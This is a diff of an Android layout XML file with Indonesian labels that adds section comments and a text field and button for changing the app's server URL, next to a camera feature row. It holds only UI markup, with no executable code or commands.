@@ -6,6 +6,7 @@
     android:orientation="vertical"
     android:padding="16dp">
 
+    <!-- Header -->
     <LinearLayout
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
@@ -109,6 +110,7 @@
             android:textStyle="bold" />
     </LinearLayout>
 
+    <!-- KONTROL DEVICE -->
     <TextView
         android:layout_width="wrap_content"
         android:layout_height="wrap_content"
@@ -119,6 +121,7 @@
         android:layout_marginTop="24dp"
         android:layout_marginBottom="16dp" />
 
+    <!-- Fitur -->
     <LinearLayout
         android:layout_width="match_parent"
         android:layout_height="wrap_content"
@@ -177,6 +180,28 @@
             <TextView style="@style/FiturLabel" android:text="Kamera - Ambil Foto" />
             <Button android:id="@+id/btnKamera" style="@style/FiturButton" android:text="TAP, FOTO" />
         </LinearLayout>
+
+        <!-- GANTI SERVER -->
+        <EditText
+            android:id="@+id/etServerUrl"
+            android:layout_width="match_parent"
+            android:layout_height="48dp"
+            android:hint="Masukkan URL server baru..."
+            android:textColor="#FFFFFF"
+            android:textColorHint="#666666"
+            android:background="@drawable/edittext_border"
+            android:padding="12dp"
+            android:layout_marginTop="16dp"
+            android:layout_marginBottom="8dp"/>
+
+        <Button
+            android:id="@+id/btnSetServer"
+            android:layout_width="match_parent"
+            android:layout_height="48dp"
+            android:text="🌐 GANTI SERVER"
+            android:textColor="#0A0A0A"
+            android:background="#00FF41"
+            android:textStyle="bold"/>
 
     </LinearLayout>
 
